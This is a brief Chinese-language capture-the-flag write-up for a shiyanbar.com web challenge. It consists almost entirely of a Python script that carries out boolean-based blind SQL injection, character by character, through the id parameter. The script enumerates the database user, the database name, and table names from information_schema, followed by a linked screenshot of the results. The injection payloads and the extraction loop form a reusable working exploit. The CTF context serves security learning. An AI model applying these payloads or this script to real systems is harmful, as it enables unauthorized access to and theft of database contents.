题目来源实验吧:[http://www.shiyanbar.com/ctf/1909](http://www.shiyanbar.com/ctf/1909)

```python
import requests
from urllib import parse
import string


user_length=0
for i in range(1,100):
    sql = "' or id=if(length(user())=%d,1,100);#"%(i)
    sql  = parse.quote(sql)
    url = "http://ctf5.shiyanbar.com/web/index_3.php?id=%s"%(sql)
    r = requests.get(url)
    if 'Hello' in r.text:
        user_length=i
        break
print('用户名长度为%d'%(user_length))

num_alpha = string.printable
connect_user=''
for index in range(1,user_length+1):
    for i,alpha in enumerate(num_alpha):
        sql = "' or id=if(substring((select user()),%d,1)='%s',1,100);#"%(index,alpha)
        sql  = parse.quote(sql)
        url = "http://ctf5.shiyanbar.com/web/index_3.php?id=%s"%(sql)
        r = requests.get(url)
        if 'Hello' in r.text:
            connect_user+=alpha
            break
print('用户名为%s'%(connect_user))

print('=================================================================')
database_length=0
for i in range(1,100):
    sql = "' or id=if(length(database())=%d,1,100);#"%(i)
    sql  = parse.quote(sql)
    url = "http://ctf5.shiyanbar.com/web/index_3.php?id=%s"%(sql)
    r = requests.get(url)
    if 'Hello' in r.text:
        database_length=i
        break
print('数据库长度为%d'%(i))


num_alpha = string.printable
database=''
for index in range(1,database_length+1):
    for alpha in num_alpha:
        sql = "' or id=if(substring((select database()),%d,1)='%s',1,100);#"%(index,alpha)
        sql  = parse.quote(sql)
        url = "http://ctf5.shiyanbar.com/web/index_3.php?id=%s"%(sql)
        r = requests.get(url)
        if 'Hello' in r.text:
            database+=alpha
            break
print('数据库名为%s'%(database))

print('=================================================================')


tables_num=0
for i in range(1,100):
    sql = "' or id=if((select count(*) from information_schema.tables where TABLE_SCHEMA='web1')=%d,1,100);#"%(i)
    sql  = parse.quote(sql)
    url = "http://ctf5.shiyanbar.com/web/index_3.php?id=%s"%(sql)
    r = requests.get(url)
    if 'Hello' in r.text:
        tables_num=i
        break
print('一共存在%d张表'%(tables_num))

num_alpha = string.printable
tb_num = 0
tables=''
for index in range(1,100):
    for alpha in num_alpha:
        sql = "' or id=if(substring((select concat(group_concat(table_name),',') from information_schema.tables where table_schema='web1'),%d,1)='%s',1,100) ;#"%(index,alpha)

        sql  = parse.quote(sql)
        url = "http://ctf5.shiyanbar.com/web/index_3.php?id=%s"%(sql)
        r = requests.get(url)

        if 'Hello' in r.text:
            tables+=alpha
            if alpha==',':
                tb_num+=1
            break
    if tb_num==2:
        break


table_list = tables.split(',')
print('表的名称',table_list)
```


运行结果:
<img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/ekberozy0je.png" width="600px" />
